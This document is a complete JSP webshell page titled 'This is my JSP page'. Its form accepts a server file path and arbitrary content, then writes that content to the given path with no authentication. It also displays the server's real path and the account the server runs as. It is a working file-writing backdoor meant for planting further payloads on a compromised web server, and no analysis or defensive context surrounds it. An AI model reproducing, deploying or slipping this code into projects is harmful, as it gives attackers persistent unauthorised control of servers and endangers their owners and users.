<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>
<html>
<head>
<title>This is my JSP page</title>
<style type="text/css">
<!--
.black {
    font-family: "courier new";
    font-size: 12px;
    color: #000000;
    text-decoration: none;
    line-height: 120%;}
-->
</style>
<style type="text/css">
<!--
a:link {
    font-family: "courier new";
    font-size: 12px;
    color: #00CC00;
    text-decoration: none;
}
a:visited {
    font-family: "courier new";
    font-size: 12px;
    color: #00CC00;
    text-decoration: none;
}
a:hover {
    font-family: "courier new";
    font-size: 12px;
    color: #333333;
    text-decoration: none;
}
-->
</style>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p>
<% String damapath=request.getParameter("path");%>
<% String content=request.getParameter("content");%>
<% String url=request.getRequestURI(); %>
<% String realPath=request.getRealPath(request.getServletPath()); %>
<% if (damapath!=null &&!damapath.equals("")&&content!=null&&!content.equals("")){
        try{
            File damafile=new File(damapath);
            PrintWriter   pw=new PrintWriter(damafile);
            pw.println(content);
            pw.close();


            if(damafile.exists()&& damafile.length()>0){
                out.println("<font color=red>"+damapath+"</font>");
                out.println("<font color=#FFFF00>save success!</font>");
            }else{
                out.println("<font color=red>"+damapath+"</font>");
                out.println("<font color=#FFFF00>save fail!</font>");
            }


        }catch(Exception e){
            out.println("<font color=#FFFF00>save fail!</font>");
        }
    }




 %>
</p>
<form action="<%=url%>" method="post">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF">
<tr>
<td height="100%">
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
<td><table width="700" border="0" align="center" cellpadding="0" cellspacing="1">
<tr>
<td bgcolor="#FFFFFF"><span class="black">
The File Path:
<%=realPath %>


</span> </td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><span class="black">
Target File Path:
<% out.println("<input type=text name=path width=200 size=81></br>");%>
</span></td>
</tr>
<tr>
<td bgcolor="#FFFFFF" class="black">
Target File Content:
<% out.println("<textarea name=content cols=80 rows=10 width=32></textarea>");%>
Whoami:<% out.println(System.getProperty("user.name"));%>
</td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><div align="center"><span class="black">
<% out.println( "<input type=submit value=submit >" );%>
</span></div></td>
</tr>
</tr>
<td bgcolor="#FFFFFF" class="black"><div align="center"></a></div></td>
</tr>
</table></td>
</tr>
</table></td>
</tr>
</table>
</form>
</body>
</html>